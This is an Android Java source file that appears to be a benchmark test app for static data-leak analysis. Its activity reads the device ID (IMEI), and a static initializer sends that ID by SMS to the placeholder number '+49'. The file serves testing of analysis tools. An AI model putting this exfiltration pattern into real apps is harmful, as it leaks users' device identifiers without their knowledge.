package de.ecspride.androidtestapps.staticinitialization;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class StaticInitialization extends Activity {
	public static String im;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_static_initialization);
		
		im = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
		StaticInitClass1 s1 = new StaticInitClass1();
	}

	public static class StaticInitClass1{
		static{
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49", null, im, null, null);  
		}
		
	}
}
